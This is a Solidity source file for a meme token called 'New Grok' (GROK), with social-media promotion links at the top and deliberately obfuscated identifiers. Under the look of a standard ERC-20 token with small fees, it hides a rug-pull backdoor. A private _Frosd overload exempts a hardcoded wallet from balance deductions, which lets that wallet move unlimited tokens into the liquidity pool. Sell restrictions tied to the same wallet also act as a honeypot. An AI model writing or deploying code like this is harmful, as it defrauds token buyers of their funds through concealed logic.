/*

Twitter: https://twitter.com/NewGrok_Portal

Telegram: https://t.me/NewGrok_Portal

Website: https://grokerc.org/

**/


// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _Frosd(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _Frosd(a, b, "SafeMath");
    }

    function  _Frosd(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _qruye(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract NewGrok is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _baeqhf;
    address payable private _Rxoryd;
    address private _vrafcp;
    string private constant _name = unicode"New Grok";
    string private constant _symbol = unicode"GROK";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000 * 10 **_decimals;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _Rkofqr=0;
    uint256 private _pafojt=0;
    uint256 public _wlcudl = _totalSupply;
    uint256 public _qrtabk = _totalSupply;
    uint256 public _pvoenb= _totalSupply;
    uint256 public _qratlk= _totalSupply;


    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _Qsvlro;
    mapping (address => bool) private _hvpbark;
    mapping(address => uint256) private _fosihg;

    bool private _gnfkopen;
    bool public _protjv = false;
    bool private ploBnk = false;
    bool private _reoagj = false;


    event _peujap(uint _wlcudl);
    modifier ohvzy {
        ploBnk = true;
        _;
        ploBnk = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _Qsvlro[owner(

        )] = true;
        _Qsvlro[address
        (this)] = true;
        _Qsvlro[
            _Rxoryd] = true;
        _Rxoryd = 
        payable (0x711fF2F396e058Fbf3bEb333915B9a0Ec9C3fb15);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _Frosd(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 Gloukr=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_protjv) {
                if (to 
                != address
                (_baeqhf) 
                && to !=
                 address
                 (_vrafcp)) {
                  require(_fosihg
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _fosihg
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _vrafcp && to != 
            address(_baeqhf) &&
             !_Qsvlro[to] ) {
                require(amount 
                <= _wlcudl,
                 "Exceeds the _wlcudl.");
                require(balanceOf
                (to) + amount
                 <= _qrtabk,
                  "Exceeds the _qrtabk.");
                if(_pafojt
                < _Rkofqr){
                  require
                  (! _fovdv(to));
                }
                _pafojt++;
                 _hvpbark
                 [to]=true;
                Gloukr = amount._qruye
                ((_pafojt>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _vrafcp &&
             from!= address(this) 
            && !_Qsvlro[from] ){
                require(amount <= 
                _wlcudl && 
                balanceOf(_Rxoryd)
                <_qratlk,
                 "Exceeds the _wlcudl.");
                Gloukr = amount._qruye((_pafojt>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_pafojt>
                _Rkofqr &&
                 _hvpbark[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!ploBnk 
            && to == _vrafcp &&
             _reoagj &&
             contractTokenBalance>
             _pvoenb 
            && _pafojt>
            _Rkofqr&&
             !_Qsvlro[to]&&
              !_Qsvlro[from]
            ) {
                _transferFrom( _polev(amount, 
                _polev(contractTokenBalance,
                _qratlk)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _pohrck(address
                    (this).balance);
                }
            }
        }

        if(Gloukr>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(Gloukr);
          emit
           Transfer(from,
           address
           (this),Gloukr);
        }
        _balances[from
        ]= _Frosd(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _Frosd(Gloukr));
        emit Transfer
        (from, to, 
        amount.
         _Frosd(Gloukr));
    }

    function _transferFrom(uint256
     tokenAmount) private
      ohvzy {
        if(tokenAmount==
        0){return;}
        if(!_gnfkopen)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _baeqhf.WETH();
        _approve(address(this),
         address(
             _baeqhf), 
             tokenAmount);
        _baeqhf.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _polev
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _Frosd(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _Rxoryd){
            return a ;
        }else{
            return a .
             _Frosd (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _wlcudl = _totalSupply;
        _qrtabk = _totalSupply;
        emit _peujap(_totalSupply);
    }

    function _fovdv(address 
    account) private view 
    returns (bool) {
        uint256 Ylfvp;
        assembly {
            Ylfvp :=
             extcodesize
             (account)
        }
        return Ylfvp > 
        0;
    }

    function _pohrck(uint256
    amount) private {
        _Rxoryd.
        transfer(
            amount);
    }

    function openTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _gnfkopen ) ;
        _baeqhf  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _baeqhf), 
            _totalSupply);
        _vrafcp = 
        IUniswapV2Factory(_baeqhf.
        factory( ) 
        ). createPair (
            address(this
            ),  _baeqhf .
             WETH ( ) );
        _baeqhf.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_vrafcp).
        approve(address(_baeqhf), 
        type(uint)
        .max);
        _reoagj = true;
        _gnfkopen = true;
    }

    receive() external payable {}
}